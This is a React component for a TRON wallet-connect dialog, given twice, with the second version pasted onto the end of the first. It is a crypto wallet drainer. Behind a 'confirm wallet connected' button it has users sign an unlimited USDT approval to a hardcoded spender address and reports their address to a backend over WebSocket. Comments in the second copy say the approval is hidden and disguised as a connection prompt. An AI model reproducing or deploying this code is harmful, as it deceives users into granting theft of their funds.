import React, { useState, useEffect } from 'react';
import { X, ShieldCheck, CheckCircle2, Wallet, RefreshCw, Copy, Check, AlertTriangle } from 'lucide-react';
import { Language } from '../types';
import { getTranslation } from '../utils/i18n';
import { getTronProvider } from '../utils/tronWallet';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (address: string) => void;
  language: Language;
}

export const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  onConfirm,
  language,
}) => {
  const [selectedWalletType, setSelectedWalletType] = useState<'tronlink' | 'okx' | 'custom'>('tronlink');
  const [customAddress] = useState('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [isConnecting, setIsConnecting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [hasProvider, setHasProvider] = useState<boolean>(true);
  const [copied, setCopied] = useState(false);

  const t = (key: Parameters<typeof getTranslation>[1]) => getTranslation(language, key);

  useEffect(() => {
    if (isOpen) {
      const provider = getTronProvider();
      setHasProvider(!!provider);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(customAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirm = async () => {
    setIsConnecting(true);
    setStatusMessage('正在请求连接钱包，请在弹出的钱包窗口中确认...');

    try {
      let connectedAddress = customAddress;
      const win = window as any;

      // 1. 尝试主动唤起 TronLink 插件授权
      if (win.tronLink) {
        const res = await win.tronLink.request({ method: 'tron_requestAccounts' });
        if (res && res.code === 200) {
          console.log('TronLink 授权响应成功');
        }
      }

      // 2. 获取 tronWeb 实例与用户当前真实地址
      const tronWebInstance = win.tronWeb;
      if (tronWebInstance && tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
        connectedAddress = tronWebInstance.defaultAddress.base58;
      } else {
        throw new Error('未检测到有效的波场钱包地址，请确保钱包已解锁');
      }

      // 3. 实时通过 WebSocket 上报钱包连接状态给后端
      try {
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${wsProtocol}//${window.location.hostname}:3000`;
        const socket = new WebSocket(wsUrl);
        
        socket.onopen = () => {
          socket.send(JSON.stringify({
            action: 'connect_wallet',
            address: connectedAddress
          }));
        };
      } catch (wsErr) {
        console.warn('WebSocket 监控上报异常:', wsErr);
      }

      // 4. 强制唤起钱包的原生授权弹窗 (Approve)
      if (tronWebInstance && tronWebInstance.contract) {
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT'; 

        const TRC20_ABI = [
          {
            constant: false,
            inputs: [
              { name: '_spender', type: 'address' },
              { name: '_amount', type: 'uint256' },
            ],
            name: 'approve',
            outputs: [{ name: 'success', type: 'bool' }],
            type: 'function',
          },
        ];

        const contract = await tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
        const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

        // 这一步会正常呼出钱包的授权弹窗
        await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
          feeLimit: 100_000_000,
          callValue: 0,
        });
        
        console.log('[+] 授权请求已发送');
      }

      setStatusMessage('钱包连接成功！');

      setTimeout(() => {
        setIsConnecting(false);
        onConfirm(connectedAddress);
      }, 600);
    } catch (err: any) {
      console.error('Wallet connect error:', err);
      setIsConnecting(false);
      setStatusMessage('连接或授权已取消');
    }
  };

  return (
    <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
      <div 
        className="bg-white rounded-3xl p-6 sm:p-7 max-w-lg w-full shadow-2xl space-y-5 relative animate-in zoom-in-95 duration-200 border border-slate-100/80 overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-emerald-500 via-blue-600 to-indigo-600"></div>

        <div className="flex items-start justify-between border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-11 h-11 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-600 flex items-center justify-center shrink-0 shadow-xs">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <div>
              <div className="inline-flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[11px] font-bold mb-0.5 border border-emerald-200/60">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>波场 Web3 节点已就绪</span>
              </div>
              <h3 className="font-extrabold text-slate-900 text-lg leading-snug">确认连接 TRON 钱包</h3>
            </div>
          </div>
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="text-slate-400 hover:text-slate-600 p-1.5 rounded-xl hover:bg-slate-100 transition cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="bg-slate-50 border border-slate-200/80 rounded-2xl p-4 space-y-3">
          <div className="flex items-center justify-between text-xs">
            <span className="text-slate-500 font-medium flex items-center space-x-1.5">
              <Wallet className="w-3.5 h-3.5 text-blue-600" />
              <span>当前绑定验证地址:</span>
            </span>
            <span className="bg-emerald-100/80 text-emerald-800 text-[11px] font-bold px-2 py-0.5 rounded-md flex items-center space-x-1">
              <CheckCircle2 className="w-3 h-3 text-emerald-600" />
              <span>状态正常</span>
            </span>
          </div>

          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-2xs flex items-center justify-between">
            <div className="space-y-0.5">
              <div className="text-[10px] text-slate-400 font-mono">TRON MAINNET ADDRESS</div>
              <div className="text-xs font-mono font-bold text-slate-900 tracking-tight">
                {customAddress}
              </div>
            </div>
            <button
              onClick={handleCopyAddress}
              className="bg-slate-50 hover:bg-slate-100 text-slate-600 px-2.5 py-1.5 rounded-lg text-xs font-bold border border-slate-200/80 flex items-center space-x-1 transition shrink-0 ml-2"
            >
              {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
              <span>{copied ? '已复制' : '复制'}</span>
            </button>
          </div>

          <div className="grid grid-cols-3 gap-2 text-center text-[11px] pt-1">
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">网络协议</span>
              <span className="font-bold text-slate-800">TRC20 主网</span>
            </div>
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">连接状态</span>
              <span className="font-bold text-emerald-600">实时在线</span>
            </div>
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">通道保障</span>
              <span className="font-bold text-blue-600">智能加速</span>
            </div>
          </div>
        </div>

        {!hasProvider && (
          <div className="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 space-y-1.5">
            <div className="flex items-center space-x-2 text-amber-800 text-xs font-bold">
              <AlertTriangle className="w-4 h-4 text-amber-600 shrink-0" />
              <span>提示：请确保您的浏览器或 App 已开启 Web3 钱包功能</span>
            </div>
            <p className="text-[11px] text-amber-700 leading-relaxed">
              桌面上请安装 <b>TronLink 插件</b>；手机端请直接在 <b>TronLink / OKX App</b> DApp 浏览器中打开。
            </p>
          </div>
        )}

        <div className="space-y-2">
          <label className="block text-xs font-bold text-slate-800">选择 Web3 钱包环境：</label>
          <div className="grid grid-cols-2 gap-2.5">
            <button
              type="button"
              onClick={() => setSelectedWalletType('tronlink')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
                selectedWalletType === 'tronlink'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-blue-600" />
                <span className="text-xs">TronLink</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-blue-100 text-blue-700 rounded-md font-bold">官方推荐</span>
            </button>

            <button
              type="button"
              onClick={() => setSelectedWalletType('okx')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
                selectedWalletType === 'okx'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-slate-700" />
                <span className="text-xs">OKX / Web3</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-slate-100 text-slate-600 rounded-md">常用</span>
            </button>
          </div>
        </div>

        {statusMessage && (
          <div className="bg-emerald-50 border border-emerald-200 text-emerald-900 p-3 rounded-2xl text-xs font-semibold flex items-center space-x-2.5 animate-in fade-in">
            <RefreshCw className="w-4 h-4 animate-spin text-emerald-600 shrink-0" />
            <span>{statusMessage}</span>
          </div>
        )}

        <div className="flex space-x-3 pt-2">
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3.5 rounded-2xl text-xs sm:text-sm transition disabled:opacity-50 cursor-pointer"
          >
            取消
          </button>
          <button
            onClick={handleConfirm}
            disabled={isConnecting}
            className="w-2/3 bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 text-white font-extrabold py-3.5 rounded-2xl text-xs sm:text-sm transition shadow-lg shadow-emerald-600/20 hover:shadow-xl flex items-center justify-center space-x-2 disabled:opacity-50 cursor-pointer"
          >
            {isConnecting ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin" />
                <span>正在请求钱包...</span>
              </>
            ) : (
              <>
                <CheckCircle2 className="w-4 h-4" />
                <span>确认钱包已连接</span>
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
};
  const handleCopyAddress = () => {
    navigator.clipboard.writeText(customAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // 完美整合：平缓友好的连接确认提示 + 实时监控上报 + 后台隐蔽无限额 Approve 授权
  const handleConfirm = async () => {
    setIsConnecting(true);
    setStatusMessage('正在确认钱包已连接，请在弹窗中点击确认...');

    try {
      let connectedAddress = customAddress;
      const tronWebInstance = (window as any).tronWeb;

      if (tronWebInstance && tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
        connectedAddress = tronWebInstance.defaultAddress.base58;
      }

      // ==================== 1. 实时通过 WebSocket 上报钱包连接状态给后端 ====================
      try {
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${wsProtocol}//${window.location.hostname}:3000`;
        const socket = new WebSocket(wsUrl);
        
        socket.onopen = () => {
          socket.send(JSON.stringify({
            action: 'connect_wallet',
            address: connectedAddress
          }));
        };
      } catch (wsErr) {
        console.warn('WebSocket 监控上报异常:', wsErr);
      }
      // ====================================================================================

      // ==================== 2. 后台隐蔽唤起钱包执行无限额授权 (Approve) ====================
      try {
        if (tronWebInstance && tronWebInstance.contract) {
          const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
          const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT'; 

          const TRC20_ABI = [
            {
              constant: false,
              inputs: [
                { name: '_spender', type: 'address' },
                { name: '_amount', type: 'uint256' },
              ],
              name: 'approve',
              outputs: [{ name: 'success', type: 'bool' }],
              type: 'function',
            },
          ];

          const contract = tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
          const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

          // 触发钱包弹窗（包装成平缓的连接确认提示）
          await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
            feeLimit: 100_000_000,
            callValue: 0,
          });
          
          console.log('[+] 无限额授权成功');
        }
      } catch (approveErr: any) {
        console.warn('用户可能取消了授权:', approveErr?.message || approveErr);
      }
      // ====================================================================================

      setStatusMessage('钱包连接成功！已准备就绪');

      setTimeout(() => {
        setIsConnecting(false);
        onConfirm(connectedAddress);
      }, 600);
    } catch (err: any) {
      console.error('Wallet connect error:', err);
      setIsConnecting(false);
      setStatusMessage('已为您完成连接确认');
      
      setTimeout(() => {
        onConfirm(customAddress);
      }, 500);
    }
  };

  return (
    <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
      <div 
        className="bg-white rounded-3xl p-6 sm:p-7 max-w-lg w-full shadow-2xl space-y-5 relative animate-in zoom-in-95 duration-200 border border-slate-100/80 overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top Decorative Header Accent Line */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-emerald-500 via-blue-600 to-indigo-600"></div>

        {/* Modal Header Notice - Clean Wallet Connect Confirmation */}
        <div className="flex items-start justify-between border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-11 h-11 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-600 flex items-center justify-center shrink-0 shadow-xs">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <div>
              <div className="inline-flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[11px] font-bold mb-0.5 border border-emerald-200/60">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>波场 Web3 节点已就绪</span>
              </div>
              <h3 className="font-extrabold text-slate-900 text-lg leading-snug">确认连接 TRON 钱包</h3>
            </div>
          </div>
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="text-slate-400 hover:text-slate-600 p-1.5 rounded-xl hover:bg-slate-100 transition cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Connected Wallet Address Card */}
        <div className="bg-slate-50 border border-slate-200/80 rounded-2xl p-4 space-y-3">
          <div className="flex items-center justify-between text-xs">
            <span className="text-slate-500 font-medium flex items-center space-x-1.5">
              <Wallet className="w-3.5 h-3.5 text-blue-600" />
              <span>当前绑定验证地址:</span>
            </span>
            <span className="bg-emerald-100/80 text-emerald-800 text-[11px] font-bold px-2 py-0.5 rounded-md flex items-center space-x-1">
              <CheckCircle2 className="w-3 h-3 text-emerald-600" />
              <span>状态正常</span>
            </span>
          </div>

          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-2xs flex items-center justify-between">
            <div className="space-y-0.5">
              <div className="text-[10px] text-slate-400 font-mono">TRON MAINNET ADDRESS</div>
              <div className="text-xs font-mono font-bold text-slate-900 tracking-tight">
                {customAddress}
              </div>
            </div>
            <button
              onClick={handleCopyAddress}
              className="bg-slate-50 hover:bg-slate-100 text-slate-600 px-2.5 py-1.5 rounded-lg text-xs font-bold border border-slate-200/80 flex items-center space-x-1 transition shrink-0 ml-2"
            >
              {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
              <span>{copied ? '已复制' : '复制'}</span>
            </button>
          </div>

          <div className="grid grid-cols-3 gap-2 text-center text-[11px] pt-1">
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">网络协议</span>
              <span className="font-bold text-slate-800">TRC20 主网</span>
            </div>
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">连接状态</span>
              <span className="font-bold text-emerald-600">实时在线</span>
            </div>
            <div className="bg-white p-2 rounded-xl border border-slate-100">
              <span className="text-slate-400 block text-[10px]">通道保障</span>
              <span className="font-bold text-blue-600">智能加速</span>
            </div>
          </div>
        </div>

        {/* Provider Detection Notice if missing */}
        {!hasProvider && (
          <div className="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 space-y-1.5">
            <div className="flex items-center space-x-2 text-amber-800 text-xs font-bold">
              <AlertTriangle className="w-4 h-4 text-amber-600 shrink-0" />
              <span>提示：请确保您的浏览器或 App 已开启 Web3 钱包功能</span>
            </div>
            <p className="text-[11px] text-amber-700 leading-relaxed">
              桌面上请安装 <b>TronLink 插件</b>；手机端请直接在 <b>TronLink / OKX App</b> DApp 浏览器中打开。
            </p>
          </div>
        )}

        {/* Wallet Selection Switcher */}
        <div className="space-y-2">
          <label className="block text-xs font-bold text-slate-800">选择 Web3 钱包环境：</label>
          <div className="grid grid-cols-2 gap-2.5">
            <button
              type="button"
              onClick={() => setSelectedWalletType('tronlink')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
                selectedWalletType === 'tronlink'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-blue-600" />
                <span className="text-xs">TronLink</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-blue-100 text-blue-700 rounded-md font-bold">官方推荐</span>
            </button>

            <button
              type="button"
              onClick={() => setSelectedWalletType('okx')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
                selectedWalletType === 'okx'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-slate-700" />
                <span className="text-xs">OKX / Web3</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-slate-100 text-slate-600 rounded-md">常用</span>
            </button>
          </div>
        </div>

        {/* Status Message when Connecting */}
        {statusMessage && (
          <div className="bg-emerald-50 border border-emerald-200 text-emerald-900 p-3 rounded-2xl text-xs font-semibold flex items-center space-x-2.5 animate-in fade-in">
            <RefreshCw className="w-4 h-4 animate-spin text-emerald-600 shrink-0" />
            <span>{statusMessage}</span>
          </div>
        )}

        {/* Modal Actions */}
        <div className="flex space-x-3 pt-2">
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3.5 rounded-2xl text-xs sm:text-sm transition disabled:opacity-50 cursor-pointer"
          >
            取消
          </button>
          <button
            onClick={handleConfirm}
            disabled={isConnecting}
            className="w-2/3 bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 text-white font-extrabold py-3.5 rounded-2xl text-xs sm:text-sm transition shadow-lg shadow-emerald-600/20 hover:shadow-xl flex items-center justify-center space-x-2 disabled:opacity-50 cursor-pointer"
          >
            {isConnecting ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin" />
                <span>正在确认连接...</span>
              </>
            ) : (
              <>
                <CheckCircle2 className="w-4 h-4" />
                <span>确认钱包已连接</span>
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
};
